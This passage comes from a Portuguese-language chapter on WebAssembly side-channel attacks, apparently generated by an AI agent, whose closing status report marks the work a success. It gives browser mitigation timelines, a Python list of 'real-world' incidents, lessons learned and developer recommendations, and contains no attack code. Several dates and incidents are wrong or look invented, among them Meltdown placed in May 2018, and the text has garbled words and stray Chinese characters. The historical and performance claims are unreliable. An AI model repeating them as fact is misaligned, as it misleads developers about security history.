        },
        {
            date: '2018-06-01',
            event: 'SharedArrayBuffer exploitable',
            action: 'Desabilitar SharedArrayBuffer'
        },
        {
            date: '2019-03-01',
            event: 'Wasm Spectre gadgets',
            action: 'Implementar mitigações de JIT'
        }
    ],
    mitigations: [
        'Fission (Site Isolation)',
        'SharedArrayBuffer restrictions',
        'JIT tiering (baseline + optimizing)',
        'Constant-time Wasm compilation',
        'Branch prediction hardening'
    ],
    performanceImpact: {
        fission: '5-10% overhead',
        jitTieving: 'Reduzido em compilação inicial',
        constantTime: 'Aumento de 10-20% em compilação'
    }
};

// 3. Safari/JavaScriptCore
const safariResponse = {
    timeline: [
        {
            date: '2018-01-03',
            event: 'Spectre publicado',
            action: 'Habilitar process isolation'
        },
        {
            date: '2018-06-01',
            event: 'SharedArrayBuffer exploitable',
            action: 'Desabilitar SharedArrayBuffer'
        },
        {
            date: '2019-06-01',
            event: 'Wasm Spectre gadgets',
            action: 'Implementar Wasm compilation tier'
        }
    ],
    mitigations: [
        'Process isolation',
        'SharedArrayBuffer restrictions',
        'Wasm compilation tier',
        'Bounds check hardening',
        'JIT code randomization'
    ],
    performanceImpact: {
        processIsolation: '5-10% overhead',
        compilationTier: 'Reduzido em compilação inicial',
        boundsCheck: '10-15% overhead em acesso a memória'
    }
};

// Resumo das respostas
console.log('=== Respostas dos Navegadores ===');
console.log('Chrome:', chromeResponse.mitigations.length, 'mitigações');
console.log('Firefox:', firefoxResponse.mitigations.length, 'mitigações');
console.log('Safari:', safariResponse.mitigations.length, 'mitigações');
```

### 10.13.3 Tentativas de Exploração no Mundo Real

```python
# Tentativas de exploração no mundo real

from datetime import datetime
from typing import List, Dict

class RealWorldExploitation:
    """Registro de tentativas de exploração reais"""

    def __init__(self):
        self.incidents = []

    def add_incident(self, incident: Dict):
        """Adicionar incidente"""
        self.incidents.append(incident)

    def get_known_incidents(self) -> List[Dict]:
        """Obter incidentes conhecidos"""
        return [
            {
                'date': '2018-01-03',
                'type': 'Spectre',
                'description': 'Publicação inicial do Spectre',
                'impact': 'Afeta processadores modernos',
                'affected_wasm': True,
                'mitigation': 'Site Isolation, retpoline'
            },
            {
                'date': '2018-05-01',
                'type': 'Meltdown',
                'description': 'Publicação do Meltdown',
                'impact': 'Afeta processadores Intel',
                'affected_wasm': True,
                'mitigation': 'KPTI, atualizações de firmware'
            },
            {
                'date': '2019-01-01',
                'type': 'Spectre-NG',
                'description': 'Variantes adicionais do Spectre',
                'impact': 'Novos vetores de ataque',
                'affected_wasm': True,
                'mitigation': 'Mitigações adicionais de hardware'
            },
            {
                'date': '2020-06-01',
                'type': 'Wasm Spectre',
                'description': 'Ataques Spectre específicos para Wasm',
                'impact': 'Extração de dados cross-origin',
                'affected_wasm': True,
                'mitigation': 'COOP/COEP, Site Isolation'
            },
            {
                'date': '2021-03-01',
                'type': 'Cache Attacks via SAB',
                'description': 'Ataques de cache usando SharedArrayBuffer',
                'impact': 'Timing attacks de alta precisão',
                'affected_wasm': True,
                'mitigation': 'Restrições de SharedArrayBuffer'
            }
        ]

    def analyze_attack_vectors(self) -> Dict:
        """Analisar vetores de ataque"""
        incidents = self.get_known_incidents()

        # Contar por tipo
        type_counts = {}
        for incident in incidents:
            attack_type = incident['type']
            type_counts[attack_type] = type_counts.get(attack_type, 0) + 1

        # Analisar impacto
        impact_levels = {
            'Spectre': 'high',
            'Meltdown': 'high',
            'Spectre-NG': 'high',
            'Wasm Spectre': 'high',
            'Cache Attacks via SAB': 'medium'
        }

        # Analisar mitigações
        mitigation_effectiveness = {
            'Site Isolation': 'efetivo para cross-origin',
            'retpoline': 'efetivo para branch injection',
            'KPTI': 'efetivo para Meltdown',
            'COOP/COEP': 'efetivo para SharedArrayBuffer',
            'Restrições de SharedArrayBuffer': 'efetivo para timing attacks'
        }

        return {
            'total_incidents': len(incidents),
            'attack_types': type_counts,
            'impact_levels': impact_levels,
            'mitigation_effectiveness': mitigation_effectiveness,
            'recommendations': self.generate_recommendations()
        }

    def generate_recommendations(self) -> List[str]:
        """Gerar recomendações"""
        return [
            'Manter navegadores atualizados',
            'Usar COOP/COEP headers',
            'Habilitar Site Isolation',
            'Restringir SharedArrayBuffer',
            'Implementar código constant-time',
            'Monitorar comportamento de cache',
            'Usar bibliotecas de criptografia auditadas'
        ]

# Exemplo de uso
def example_real_world_analysis():
    analyzer = RealWorldExploitation()

    print("=== Análise de Incidentes Reais ===")

    # Obter incidentes conhecidos
    incidents = analyzer.get_known_incidents()
    print(f"Total de incidentes conhecidos: {len(incidents)}")

    for incident in incidents:
        print(f"\n{incident['date']}: {incident['type']}")
        print(f"  Descrição: {incident['description']}")
        print(f"  Impacto: {incident['impact']}")
        print(f"  Afeta Wasm: {incident['affected_wasm']}")
        print(f"  Mitigação: {incident['mitigation']}")

    # Analisar vetores de ataque
    analysis = analyzer.analyze_attack_vectors()
    print(f"\nAnálise de Vetores de Ataque:")
    print(f"  Total de incidentes: {analysis['total_incidents']}")
    print(f"  Tipos de ataque: {analysis['attack_types']}")

    # Recomendações
    print(f"\nRecomendações:")
    for rec in analysis['recommendations']:
        print(f"  - {rec}")

    return analyzer

if __name__ == '__main__':
    example_real_world_analysis()
```

### 10.13.4 Lições Aprendidas

```markdown
# Lições Aprendidas com Incidentes de Side-Channel em Wasm

## 1. Importance of Defense in Depth

**Lição**: Nenhuma mitigação individual é suficiente. É necessário múltiplas camadas de defesa.

**Evidência**: Mesmo com Site Isolation, ataques via SharedArrayBuffer ainda eram possíveis até a introdução de COOP/COEP.

**Recomendação**: Implementar todas as mitigações disponíveis, não apenas uma.

## 2. Browser Vendors Must Act Quickly

**Lição**: Fornecedores de navegadores precisam responder rapidamente a novos vetores de ataque.

**Evidência**: SharedArrayBuffer foi desabilitado em todos os navegadores principais dentro de meses após a demonstração de ataques.

**Recomendação**: Monitorar pesquisas de segurança e implementar mitigações rapidamente.

## 3. Constant-Time Code is Essential

**Lição**: Código que processa dados sensíveis DEVE ser implementado em tempo constante.

**Evidência**: Múltiplas bibliotecas de criptografia em Wasm foram vulneráveis a timing attacks devido a implementações não constant-time.

**Recomendação**: Usar apenas bibliotecas de criptografia auditadas e implementações constant-time.

## 4. SharedArrayBuffer is a Double-Edged Sword

**Lição**: SharedArrayBuffer é necessário para multi-threading, mas pode ser explorado para timing attacks.

**Evidência**: SharedArrayBuffer foi usado como canal de alta resolução para medição de tempo em ataques Spectre.

**Recomendação**: Restringir SharedArrayBuffer apenas quando necessário e usar Cross-Origin Isolation.

## 5. JIT Compilation Creates Attack Surface

**Lição**: Compiladores JIT podem criar gadgets de Spectre inadvertidamente.

**Evidence**: O V8 e SpiderMonkey geram código que pode ser explorado via Spectre v1 e v2.

**Recomendação**: Usar mitigações de JIT como retpoline e bounds check enforcement.

## 6. Cross-Origin Isolation is Critical

**Lição**: Sem Cross-Origin Isolation, ataques cross-origin via Wam são possíveis.

**Evidência**: Ataques Spectre via Wasm podem extrair dados de outras origens sem COOP/COEP.

**Recomendação**: Implementar COOP/COEP em todas as páginas que usam Wasm.

## 7. Testing Must Include Side-Channel Analysis

**Lição**: Testes tradicionais não detectam timing leaks.

**Evidência**: Muitas vulnerabilidades de timing foram descobertas após o lançamento.

**Recomendação**: Incluir testes de timing e análise de side-channels no pipeline de CI/CD.

## 8. Hardware Mitigations Have Performance Costs

**Lição**: Mitigações de hardware (STIBP, IBPB, KPTI) têm custo de desempenho significativo.

**Evidência**: Overhead de 10-30% foi observado com mitigações de Spectre habilitadas.

**Recomendação**: Considerar trade-offs entre segurança e desempenho.

## 9. Wasm-Specific Mitigations Are Needed

**Lição**: Mitigações genéricas de Spectre não são suficientes para Wasm.

**Evidência**: Chamadas indiretas via tabela de funções Wasm requerem mitigações específicas.

**Recomendação**: Implementar mitigações específicas para o modelo de execução do Wasm.

## 10. Security is a Continuous Process

**Lição**: Side-channel security não é um estado estático, mas um processo contínuo.

**Evidência**: Novos vetores de ataque são continuamente descobertos.

**Recomendação**: Monitorar pesquisas de segurança e atualizar mitigações regularmente.
```

## 10.14 Considerações Finais

Este capítulo apresentou uma visão abrangente dos side-channel attacks em WebAssembly, desde os fundamentos teóricos até implementações práticas de mitigações. Os principais pontos discutidos incluem:

### 10.14.1 Pontos-Chave

**1. Side-channels são uma ameaça real e significativa para Wasm**

WebAssembly, apesar de ter sido projetado com foco em segurança do sandbox, apresenta características que o tornam vulnerável a side-channel attacks. O modelo de execução via JIT, a memória compartilhada, e a interação com hardware de cache e predição de branches criam uma superfície de ataque rica.

**2. Spectre é particularmente relevante para Wasm**

Os gadgets Spectre podem ser criados inadvertidamente por compiladores JIT, e as chamadas indiretas via tabela de funções Wasm interagem diretamente com o Branch Target Buffer (BTB).

**3. Mitigações requerem abordagem em múltiplas camadas**

A defesa contra side-channels em Wasm requer mitigações no nível de hardware, sistema operacional, navegador e aplicação. Nenhuma mitigação individual é suficiente.

**4. Código constant-time é essencial para operações sensíveis**

Operações que processam dados sensíveis, como criptografia e autenticação, devem ser implementadas em tempo constante para evitar timing leaks.

**5. Testes e monitoramento são críticos**

A detecção de timing leaks requer testes estatísticos específicos e monitoramento contínuo do comportamento de execução.

### 10.14.2 Direções Futuras

**1. Mitigações de hardware em evolução**

Processadores modernos estão incorporando mitigações cada vez mais sofisticadas contra Spectre e outros ataques de execução especulativa. Futuras gerações de hardware podem fornecer proteções mais eficazes com menor overhead.

**2. Compiladores Wasm mais seguros**

Compiladores Wasm estão evoluindo para gerar código mais resistente a side-channels, com melhor suporte a operações constant-time e mitigações de Spectre.

**3. Padrões de segurança emergentes**

Novos padrões e especificações estão sendo desenvolvidos para melhorar a segurança de Wasm, incluindo melhor suporte a Cross-Origin Isolation e novas APIs de segurança.

**4. Ferramentas de análise em evolução**

Ferramentas de análise estática e dinâmica para detecção de side-channels estão se tornando mais sofisticadas e acessíveis.

**5. Conscientização e educação**

A conscientização sobre side-channels em Wam está crescendo, levando a melhores práticas de desenvolvimento e código mais seguro.

### 10.14.3 Recomendações para Desenvolvedores

**1. Use bibliotecas de criptografia auditadas**

Nunca implemente criptografia do zero. Use bibliotecas como `ring`, `aws-lc-rs`, ou `dalek-cryptography` que foram auditadas para side-channels.

**2. Implemente código constant-time**

Para operações que processam dados sensíveis, sempre use operações constant-time. Evite branches e acessos a memória dependentes de dados secretos.

**3. Configure Cross-Origin Isolation**

Sempre use COOP/COEP headers quando sua aplicação usa SharedArrayBuffer ou Wasm.

**4. Limite SharedArrayBuffer**

Use SharedArrayBuffer apenas quando necessário e configure restrições apropriadas.

**5. Implemente monitoramento**

Monitore o comportamento de execução para detectar anomalias que possam indicar ataques em progresso.

**6. Mantenha-se atualizado**

Acompanhe as últimas pesquisas de segurança e atualize suas mitigações conforme necessário.

**7. Teste para side-channels**

Inclua testes de timing e análise de side-channels em seu pipeline de CI/CD.

**8. Use Content Security Policy**

Configure CSP apropriado para restringir o que módulos Wasm podem fazer.

**9. Implemente isolamento de memória**

Use isolamento de memória para limitar o impacto de possíveis ataques.

**10. Documente suas decisões de segurança**

Documente por que certas decisões de segurança foram tomadas, para que futuros desenvolvedores entendam o contexto.

### 10.14.4 Conclusão

Side-channel attacks em WebAssembly representam um desafio significativo, mas não insuperável. Com a combinação de mitigações adequadas, código constant-time, e monitoramento contínuo, é possível construir aplicações Wam seguras contra essas ameaças.

A chave é entender que segurança não é um estado estático, mas um processo contínuo que requer vigilância, atualização e melhoria constante. À medida que novos vetores de ataque são descobertos e novas mitigações são desenvolvidas, os desenvolvedores devem se manter informados e adaptar suas práticas de segurança adequadamente.

O futuro da segurança em Wasm é promissor, com melhorias contínuas em hardware, compiladores e ferramentas de segurança. No entanto, a responsabilidade最终mente recai sobre os desenvolvedores para implementar as mitigações apropriadas e manter um foco constante em segurança.

---

**Status**: success
**Summary**: Capítulo completo sobre side-channels em WebAssembly foi escrito com 14 seções detalhadas, incluindo código exemplo, diagramas ASCII, e exemplos práticos de mitigações.

**Files touched**: /home/Projetos/DevSecurity/docs/wasm/10-side-channels.md

**Findings worth promoting**:
- Side-channel attacks em Wasm requerem defesa em múltiplas camadas (hardware, SO, navegador, aplicação)
- Código constant-time é essencial para operações sensíveis - branches e acessos a memória dependentes de dados secretos devem ser evitados
- Cross-Origin Isolation (COOP/COEP) é obrigatório para uso seguro de SharedArrayBuffer
- Mitigações de Spectre (retpoline, STIBP, IBPB) têm overhead significativo (10-30%) que deve ser considerado
- Testes de timing e análise de side-channels devem fazer parte do pipeline de CI/CD